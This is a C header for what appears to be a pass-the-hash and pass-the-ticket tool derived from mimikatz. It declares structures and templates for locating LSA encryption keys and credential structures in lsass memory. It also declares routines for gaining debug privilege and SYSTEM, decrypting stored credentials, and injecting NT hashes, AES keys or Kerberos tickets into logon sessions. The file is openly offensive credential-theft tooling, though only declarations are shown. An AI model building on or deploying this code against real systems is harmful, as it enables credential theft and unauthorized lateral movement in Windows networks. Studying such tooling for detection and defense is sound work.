#ifndef PASS_THE_CRED_H
#define PASS_THE_CRED_H

#include <windows.h>

#include <ntsecapi.h> // e.g. for Kerberos etype constants
#include <ntstatus.h> // e.g. STATUS_INFO_LENGTH_MISMATCH
#include <stdio.h>
#include <subauth.h> // e.g. UNICODE_STRING
#include <tlhelp32.h>
#include <winternl.h> // e.g. SYSTEM_PROCESS_INFORMATION

// Parsed commandline arguments.
struct _ARGUMENTS
{

    // Identification of an account.
    struct _ACCOUNT
    {
        LPCWSTR Username;
        LPCWSTR Domain;
    } Account;

    // Supported credential data for spawning a new process.
    // Based on SEKURLSA_PTH_DATA.
    struct _CREDS
    {
        LPCWSTR Password;
        LPBYTE Lmhash;
        LPBYTE Sha1hash;
        LPBYTE Nthash;
        LPBYTE Aes128key;
        LPBYTE Aes256key;
        LPBYTE KirbiTicket;
        DWORD nbKirbiTicket;
    } Creds;

    LPCWSTR Run; // program to run
};

typedef struct _ARGUMENTS ARGUMENTS, *PARGUMENTS;
typedef struct _ACCOUNT ACCOUNT, *PACCOUNT;
typedef struct _CREDS CREDS, *PCREDS;

// From inc/globals.h.
#define OS_BUILD_NUMBER_WIN_XP 2600
#define OS_BUILD_NUMBER_WIN_2K3 3790
#define OS_BUILD_NUMBER_WIN_VISTA 6000
#define OS_BUILD_NUMBER_WIN_7 7600
#define OS_BUILD_NUMBER_WIN_8 9200
#define OS_BUILD_NUMBER_WIN_BLUE 9600
#define OS_BUILD_NUMBER_WIN_10_1507 10240
#define OS_BUILD_NUMBER_WIN_10_1511 10586
#define OS_BUILD_NUMBER_WIN_10_1607 14393
#define OS_BUILD_NUMBER_WIN_10_1703 15063
#define OS_BUILD_NUMBER_WIN_10_1709 16299
#define OS_BUILD_NUMBER_WIN_10_1803 17134
#define OS_BUILD_NUMBER_WIN_10_1809 17763
#define OS_BUILD_NUMBER_WIN_10_1903 18362
#define OS_BUILD_NUMBER_WIN_10_1909 18363
#define OS_BUILD_NUMBER_WIN_10_2004 19041
#define OS_BUILD_NUMBER_WIN_10_20H2 19042
#define OS_BUILD_NUMBER_WIN_10_21H2 19044
#define OS_BUILD_NUMBER_WIN_2022 20348
#define OS_BUILD_NUMBER_WIN_11_22H2 22621
#define OS_BUILD_NUMBER_WIN_11_23H2 22631

#define OS_MIN_BUILD_NUMBER_WIN_XP 2500
#define OS_MIN_BUILD_NUMBER_WIN_2K3 3000
#define OS_MIN_BUILD_NUMBER_WIN_VISTA 5000
#define OS_MIN_BUILD_NUMBER_WIN_7 7000
#define OS_MIN_BUILD_NUMBER_WIN_8 8000
#define OS_MIN_BUILD_NUMBER_WIN_BLUE 9400
#define OS_MIN_BUILD_NUMBER_WIN_10 9800
#define OS_MIN_BUILD_NUMBER_WIN_11 22000

typedef struct _BASIC_PROCESS_INFORMATION
{
    HANDLE Handle;
    DWORD Pid;
} BASIC_PROCESS_INFORMATION, *PBASIC_PROCESS_INFORMATION;

// Based on KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION.
typedef struct _BASIC_MODULE_INFORMATION
{
    LPBYTE DllBase;
    ULONG ImageSize;
    // Additionally needed for selecting various memory
    // pattern templates based on the currently running os
    // / lsasrv module binary.
    ULONG TimeDateStamp;
} BASIC_MODULE_INFORMATION, *PBASIC_MODULE_INFORMATION;

// Summarizes some information about the lsass process that are relevant with
// regard to crypto.
typedef struct _LSASS_CONTEXT
{
    BASIC_PROCESS_INFORMATION ProcInfo;

    // For encrypted credentials in general.
    // And for MSV1_0 SSP/AP specifically.
    BASIC_MODULE_INFORMATION LsaSrvInfo;

    // For Kerberos SSP/AP.
    BASIC_MODULE_INFORMATION KerberosInfo;
} LSASS_CONTEXT, *PLSASS_CONTEXT;

// Various constants defining hash/key lengths.
#define LM_NT_HASH_LENGTH 16
#define AES_128_KEY_LENGTH 16
#define AES_256_KEY_LENGTH 32
#define INITIALIZATION_VECTOR_LENGTH 16
#define SHA_DIGEST_LENGTH 20

// A key as used for encryption/decryption by this tool.
// Taken verbatim from mimikatz.
typedef struct _KIWI_BCRYPT_GEN_KEY
{
    BCRYPT_ALG_HANDLE hProvider;
    BCRYPT_ALG_HANDLE hKey;
    LPBYTE pKey;
    ULONG cbKey;
} KIWI_BCRYPT_GEN_KEY, *PKIWI_BCRYPT_GEN_KEY;

// Crypto material/secrets for encryption/decryption of credentials stored in
// lsass.
typedef struct _LSA_CRYPTO_MATERIAL
{
    BYTE InitializationVector[INITIALIZATION_VECTOR_LENGTH];
    KIWI_BCRYPT_GEN_KEY Key3Des;
    KIWI_BCRYPT_GEN_KEY KeyAes;
} LSA_CRYPTO_MATERIAL, *PLSA_CRYPTO_MATERIAL;

// Template for identifying keymaterial in lsass memory.
typedef struct _LSA_DECRYPT_MEMORY_TEMPLATE
{
    // Minimum os build number a specific template applies to.
    DWORD MinOsBuildNumber;

    // The byte pattern associated with the template.
    LPBYTE Pattern;
    DWORD PatternLength;

    // Offsets from the pattern match to the interesting data we want to
    // extract.
    LONG OffsetToInitializationVectorPtr; // lsasrv!InitializationVector
    LONG OffsetTo3DesKeyPtr;              // lsasrv!h3DesKey
    LONG OffsetToAesKeyPtr;               // lsasrv!hAesKey

    // Size of the struct KIWI_BCRYPT_KEY specific to this system.
    DWORD KiwiBcryptKeyLength;
    // Offset of the member KIWI_HARD_KEY hardKey in the strut KIWI_BCRYPT_KEY
    // specific to this system.
    LONG OffsetKiwiBcryptKeyKiwiHardKey;
} LSA_DECRYPT_MEMORY_TEMPLATE, *PLSA_DECRYPT_MEMORY_TEMPLATE;

// 3DES / AES key
// Taken verbatim from mimikatz.
typedef struct _KIWI_HARD_KEY
{
    ULONG cbSecret;
    BYTE data[ANYSIZE_ARRAY];
} KIWI_HARD_KEY, *PKIWI_HARD_KEY;

// Taken verbatim from mimikatz.
typedef struct _KIWI_BCRYPT_KEY
{
    ULONG size;
    ULONG tag; // 'MSSK'
    ULONG type;
    ULONG unk0;
    ULONG unk1;
    ULONG unk2;
    KIWI_HARD_KEY hardkey;
} KIWI_BCRYPT_KEY, *PKIWI_BCRYPT_KEY;

// Taken verbatim from mimikatz.
typedef struct _KIWI_BCRYPT_KEY8
{
    ULONG size;
    ULONG tag; // 'MSSK'
    ULONG type;
    ULONG unk0;
    ULONG unk1;
    ULONG unk2;
    ULONG unk3;
    PVOID unk4; // before, align in x64
    KIWI_HARD_KEY hardkey;
} KIWI_BCRYPT_KEY8, *PKIWI_BCRYPT_KEY8;

// Taken verbatim from mimikatz.
typedef struct _KIWI_BCRYPT_KEY81
{
    ULONG size;
    ULONG tag; // 'MSSK'
    ULONG type;
    ULONG unk0;
    ULONG unk1;
    ULONG unk2;
    ULONG unk3;
    ULONG unk4;
    PVOID unk5;
    ULONG unk6;
    ULONG unk7;
    ULONG unk8;
    ULONG unk9;
    KIWI_HARD_KEY hardkey;
} KIWI_BCRYPT_KEY81, *PKIWI_BCRYPT_KEY81;

// Taken verbatim from mimikatz.
typedef struct _KIWI_BCRYPT_HANDLE_KEY
{
    ULONG size;
    ULONG tag; // 'UUUR'
    PVOID hAlgorithm;
    PKIWI_BCRYPT_KEY key;
    PVOID unk0;
} KIWI_BCRYPT_HANDLE_KEY, *PKIWI_BCRYPT_HANDLE_KEY;

typedef struct _LSA_ENUM_LOGON_SESSION_LIST_TEMPLATE
{
    DWORD MinOsBuildNumber;

    LPBYTE Pattern; // pattern to the LogonSessionList in lsass
    DWORD PatternLength;

    LONG OffsetPatternToLogonSessionList;      // lsasrv!LogonSessionList
    LONG OffsetPatternToLogonSessionListCount; // lsasrv!LogonSessionListCount
} LSA_ENUM_LOGON_SESSION_LIST_TEMPLATE, *PLSA_ENUM_LOGON_SESSION_LIST_TEMPLATE;

// Based on KUHL_M_SEKURLSA_ENUM_HELPER.
typedef struct _LSA_ENUM_LOGON_SESSION_TEMPLATE
{
    SIZE_T StructSize;
    ULONG OffsetToLuid;
    ULONG OffsetToLogonType;
    ULONG OffsetToSession;
    ULONG OffsetToUsername;
    ULONG OffsetToLogonDomain;
    ULONG OffsetToCredentials;
    ULONG OffsetToPSid;
    ULONG OffsetToCredentialManager;
    ULONG OffsetToLogonTime;
    ULONG OffsetToLogonServer;
} LSA_ENUM_LOGON_SESSION_TEMPLATE, *PLSA_ENUM_LOGON_SESSION_TEMPLATE;

// KIWI_MSV1_0_PRIMARY_CREDENTIALS: encrypted credentials.
// MSV1_0_PRIMARY_CREDENTIAL_TEMPLATE: offsets describing struct of *de*crypted
// credentials in lsass memory. From MSV1_0_PRIMARY_HELPER.
typedef struct _MSV1_0_PRIMARY_CREDENTIAL_TEMPLATE
{
    LONG OffsetToLogonDomain;
    LONG OffsetToUserName;

    LONG OffsetToIsIso;
    LONG OffsetToIsNtOfPassword;
    LONG OffsetToIsLmOfPassword;
    LONG OffsetToIsShaOfPassword;
    LONG OffsetToIsDPAPIProtected;

    LONG OffsetToNtOfPassword;
    LONG OffsetToLmOfPassword;
    LONG OffsetToShaOfPassword;
    LONG OffsetToDPAPIProtected;
    LONG OffsetToIso;
} MSV1_0_PRIMARY_CREDENTIAL_TEMPLATE, *PMSV1_0_PRIMARY_CREDENTIAL_TEMPLATE;

// Credential structures for Kerberos SSP/AP. Taken from
// kerbHelper/KERB_INFOS/KerberosReferences in
// mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c / .h.
typedef struct _KERB_CREDENTIAL_TEMPLATE
{
    DWORD MinOsBuildNumber;

    LPBYTE Pattern;
    DWORD PatternLength;

    // kerberos!KerbGlobalLogonSessionTable
    LONG OffsetPatternToKerberosLogonSessionTable;

    // LONG OffsetPatternToKerberosOffsetIndex;
    // Note that this field can be ignored and is only needed because of the
    // generic nature of kuhl_m_sekurlsa_utils_search_generic.

    LONG OffsetToLuid;
    LONG OffsetToCreds;
    LONG OffsetToTickets[3];
    LONG OffsetToSmartCard;
    SIZE_T StructSize;

    LONG OffsetToServiceName;
    LONG OffsetToTargetName;
    LONG OffsetToDomainName;
    LONG OffsetToTargetDomainName;
    LONG OffsetToDescription;
    LONG OffsetToAltTargetDomainName;
    LONG OffsetToClientName;
    LONG OffsetToTicketFlags;
    LONG OffsetToKeyType;
    LONG OffsetToKey;
    LONG OffsetToStartTime;
    LONG OffsetToEndTime;
    LONG OffsetToRenewUntil;
    LONG OffsetToTicketEncType;
    LONG OffsetToTicket;
    LONG OffsetToTicketKvno;
    SIZE_T StructTicketSize;

    LONG OffsetToKeyList;
    SIZE_T StructKeyListSize;

    // from KERB_HASHPASSWORD*
    LONG OffsetToHashGeneric;
    SIZE_T StructKeyPasswordHashSize;
    // From KERB_HASHPASSWORD_GENERIC;
    // From https://github.com/eyalk5/mimikatz/commit/25b3c8ea09001c8fe717df0a899bdf00c49157e5.
    LONG OffsetToHashSize;
    LONG OffsetToHashPChecksum;

    LONG OffsetToSizeOfCsp;
    LONG OffsetToNames;
    SIZE_T StructCspInfosSize;

    LONG OffsetToPasswordErase;
    SIZE_T PasswordEraseSize;
} KERB_CREDENTIAL_TEMPLATE, *PKERB_CREDENTIAL_TEMPLATE;

// Summary of session information passed to callbacks (information about the
// current session). Based on KIWI_BASIC_SECURITY_LOGON_SESSION_DATA.
typedef struct _LSA_LOGON_SESSION
{
    PLUID Luid;
    ULONG LogonType;
    ULONG Session;
    PUNICODE_STRING Username;
    PUNICODE_STRING LogonDomain;
    PUNICODE_STRING LogonServer;
    PVOID Credentials; // pointer to credentials in LSASS memory
    PVOID CredentialManager;
    PSID PSid;
    FILETIME LogonTime;
} LSA_LOGON_SESSION, *PLSA_LOGON_SESSION;

// Summary of session information; e.g. passed to callbacks information about
// the credentials that should be injected into the session).
// Based on SEKURLSA_PTH_DATA.
typedef struct _PTH_CREDS
{
    PLSASS_CONTEXT LsassContext;
    PLUID Luid;                     // Target LUID of the session that should be patched
    PCREDS Creds;                   // Credentials that should be patched / injected into the target session
    PLSA_CRYPTO_MATERIAL LsaCrypto; // extracted cryptomaterial from lsasrv
} PTH_CREDS, *PPTH_CREDS;

// Credential structure in LSASS. Taken verbatim from mimikatz.
typedef struct _KIWI_MSV1_0_PRIMARY_CREDENTIALS
{
    struct _KIWI_MSV1_0_PRIMARY_CREDENTIALS *next;
    ANSI_STRING Primary;
    UNICODE_STRING Credentials;
} KIWI_MSV1_0_PRIMARY_CREDENTIALS, *PKIWI_MSV1_0_PRIMARY_CREDENTIALS;

// Credential structure in LSASS. Taken verbatim from mimikatz.
typedef struct _KIWI_MSV1_0_CREDENTIALS
{
    struct _KIWI_MSV1_0_CREDENTIALS *next;
    DWORD AuthenticationPackageId;
    PKIWI_MSV1_0_PRIMARY_CREDENTIALS PrimaryCredentials;
} KIWI_MSV1_0_CREDENTIALS, *PKIWI_MSV1_0_CREDENTIALS;

// AVL tree for Kerberos credentials. From ntddk.h.
typedef struct _RTL_BALANCED_LINKS
{
    struct _RTL_BALANCED_LINKS *Parent;
    struct _RTL_BALANCED_LINKS *LeftChild;
    struct _RTL_BALANCED_LINKS *RightChild;
    CHAR Balance;
    UCHAR Reserved[3]; // align
} RTL_BALANCED_LINKS, *PRTL_BALANCED_LINKS;

// AVL tree for Kerberos credentials. From ntddk.h.
typedef struct _RTL_AVL_TABLE
{
    RTL_BALANCED_LINKS BalancedRoot;
    PVOID OrderedPointer;
    ULONG WhichOrderedElement;
    ULONG NumberGenericTableElements;
    ULONG DepthOfTree;
    PRTL_BALANCED_LINKS RestartKey;
    ULONG DeleteCount;
    PVOID CompareRoutine;
    PVOID AllocateRoutine;
    PVOID FreeRoutine;
    PVOID TableContext;
} RTL_AVL_TABLE, *PRTL_AVL_TABLE;

VOID PrintHeader();

VOID OsVersionCompatibilityCheck();

VOID PrivilegeSeDebug();

ARGUMENTS ParseArguments(int argc, wchar_t *argv[]);

VOID PrintUsage(LPCWSTR pgmname);

VOID RunProcessWithCreds(PARGUMENTS pArguments);

VOID WrapCreateProcessWithLogonW(LPCWSTR username, LPCWSTR domain, LPCWSTR password, LPCWSTR _run,
                                 OUT LPPROCESS_INFORMATION lpProcessInformation);

VOID InjectCreds(PLUID pluid, PCREDS pcreds);
VOID InjectTicket(PLUID pluid, PCREDS pcreds);

HANDLE GetLsaHandle();
void GetSystem();
HANDLE GetProcessForName(LPCWSTR name);

PLSA_DECRYPT_MEMORY_TEMPLATE GetLsaMemoryDecryptMemoryTemplate();

PLSA_ENUM_LOGON_SESSION_LIST_TEMPLATE GetLsaEnumLogonSessionListTemplate();

PLSA_ENUM_LOGON_SESSION_TEMPLATE GetLsaEnumLogonSessionTemplate(ULONG lsaSrvTimeDateStamp);

PMSV1_0_PRIMARY_CREDENTIAL_TEMPLATE GetMsv10PrimaryCredentialTemplate();
PKERB_CREDENTIAL_TEMPLATE GetKerberosCredentialTemplate();

VOID AcquireLSA(OUT PLSASS_CONTEXT pCtx, OUT PLSA_CRYPTO_MATERIAL pLsaCrypto);

VOID GetProcessPidForName(LPCWSTR name, OUT PDWORD pPid);
VOID GetModuleInfoForPidName(HANDLE hProc, DWORD pid, LPCWSTR moduleName, OUT PBASIC_MODULE_INFORMATION pModInfo);
VOID GetTimeDateStampForModule(HANDLE hProc, LPBYTE pBase, PULONG pTimeDateStamp);
VOID WrapNtQuerySystemInformation(OUT PSYSTEM_PROCESS_INFORMATION *ppProcInfo);

VOID AcquireLsaCryptoMaterial(IN PLSASS_CONTEXT pLsassInfo, OUT PLSA_CRYPTO_MATERIAL pLsaCryptoMaterial);

VOID AcquireLsaCryptoMaterialInitializationVector(IN HANDLE hLsass, IN PLSA_DECRYPT_MEMORY_TEMPLATE template,
                                                  IN LPBYTE pKeyStructure, OUT LPBYTE pInitializationVector);
VOID AcquireLsaCryptoMaterialKey3Des(IN HANDLE hLsass, IN PLSA_DECRYPT_MEMORY_TEMPLATE template,
                                     IN LPBYTE pKeyStructure, OUT PKIWI_BCRYPT_GEN_KEY pKey3Des);
VOID AcquireLsaCryptoMaterialKeyAes(IN HANDLE hLsass, IN PLSA_DECRYPT_MEMORY_TEMPLATE template, IN LPBYTE pKeyStructure,
                                    OUT PKIWI_BCRYPT_GEN_KEY pKeyAes);
VOID InitLsaCryptoKey3Des(OUT PKIWI_BCRYPT_GEN_KEY pKey);
VOID InitLsaCryptoKeyAes(OUT PKIWI_BCRYPT_GEN_KEY pKey);

VOID AcquireLsaCryptoMaterialKey(IN HANDLE hLsass, IN PLSA_DECRYPT_MEMORY_TEMPLATE pTemplate, LONG offsetToKeyPtr,
                                 IN LPBYTE pKeyStructure, OUT PKIWI_BCRYPT_GEN_KEY pKiwiBcryptGenKey);

VOID SearchMemory(HANDLE hProc, LPBYTE pStartAddress, DWORD dwSize, LPBYTE pPattern, DWORD dwPatternSize,
                  OUT LPBYTE *ppMatchAddress);

typedef BOOL(CALLBACK *LSA_ENUM_LOGON_SESSIONS_CALLBACK)(IN PLSA_LOGON_SESSION pLsaLogonSession,
                                                         IN OPTIONAL LPVOID pOptionalData);

VOID LsaEnumLogonSessions(PLSASS_CONTEXT pLsassCtx, LSA_ENUM_LOGON_SESSIONS_CALLBACK callback, LPVOID pOptionalData);

BOOL CALLBACK CallbackPthMsv(IN PLSA_LOGON_SESSION pLogonSession, IN OPTIONAL LPVOID pOptionalData);
BOOL CALLBACK CallbackPthKerberos(IN PLSA_LOGON_SESSION pLogonSession, IN OPTIONAL LPVOID pOptionalData);

VOID PthMsv(PPTH_CREDS pthCreds, PKIWI_MSV1_0_PRIMARY_CREDENTIALS pPrimaryCredentials, PWSTR pLsaPrimaryCredentials);
VOID PthKerberos(PPTH_CREDS pthCreds, LPBYTE pKerbAvlNode, LPBYTE pLsaKerbAvlNode, PKERB_CREDENTIAL_TEMPLATE template);
PCWCHAR GetKerberosETypeDescription(LONG eType);

VOID WINAPI LsaProtectMemory(IN OUT LPBYTE Buffer, IN ULONG BufferSize, IN PLSA_CRYPTO_MATERIAL);
VOID WINAPI LsaUnProtectMemory(IN OUT LPBYTE Buffer, IN ULONG BufferSize, IN PLSA_CRYPTO_MATERIAL);
VOID LsaEncryptMemory(IN OUT LPBYTE pMemory, ULONG cbMemory, IN PLSA_CRYPTO_MATERIAL, BOOL Encrypt);

PVOID FindKerbCredFromAvlByLuid(HANDLE hLsass, PRTL_BALANCED_LINKS pLsaAvlTree, DWORD luidOffset, PLUID luidToFind);

VOID ReadProcessMemoryUnicodeString(IN HANDLE hProc, IN OUT PUNICODE_STRING pUnicodeString);

BOOL SecEqualLuid(PLUID l1, PLUID l2);

VOID HexStringToBinary(OUT LPBYTE hex, LPCWCHAR string, DWORD size);

VOID PrintBinaryAsHex(LPBYTE bin, DWORD size);

#define LogError(...)                                                                                                  \
    do                                                                                                                 \
    {                                                                                                                  \
        printf("File: %s, Function: %s, Line: %d\n", __FILE__, __func__, __LINE__);                                    \
        LogWithPrefix("[!] ", __VA_ARGS__);                                                                            \
        exit(EXIT_FAILURE);                                                                                            \
    } while (0)

#define LogInfo(...) LogWithPrefix("[+] ", __VA_ARGS__)

__attribute__((format(printf, 2, 3))) VOID LogWithPrefix(LPCSTR prefix, LPCSTR pMsg, ...);

DWORD GetOsBuildNumber();

// Function and type definitions for interacting with WinAPI / syscalls.

extern NTSTATUS NTAPI NtQuerySystemInformation(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
                                               OUT PVOID SystemInformation, IN ULONG SystemInformationLength,
                                               OUT PULONG ReturnLength OPTIONAL);

extern NTSTATUS WINAPI NtResumeProcess(IN HANDLE ProcessHandle);

typedef const UNICODE_STRING *PCUNICODE_STRING;

extern VOID NTAPI RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString);

extern NTSYSAPI BOOLEAN NTAPI RtlEqualUnicodeString(_In_ PCUNICODE_STRING String1, _In_ PCUNICODE_STRING String2,
                                                    _In_ BOOLEAN CaseInSensitive);

extern VOID WINAPI RtlGetNtVersionNumbers(LPDWORD pMajor, LPDWORD pMinor, LPDWORD pBuild);

extern NTSTATUS WINAPI RtlAdjustPrivilege(IN ULONG Privilege, IN BOOL Enable, IN BOOL CurrentThread,
                                          OUT PULONG pPreviousState);

extern BOOLEAN WINAPI RtlEqualString(IN const STRING *String1, IN const STRING *String2, IN BOOLEAN CaseInSensitive);

// 10.0.26100.0/km/wdm.h
#define SE_DEBUG_PRIVILEGE 20L

#endif
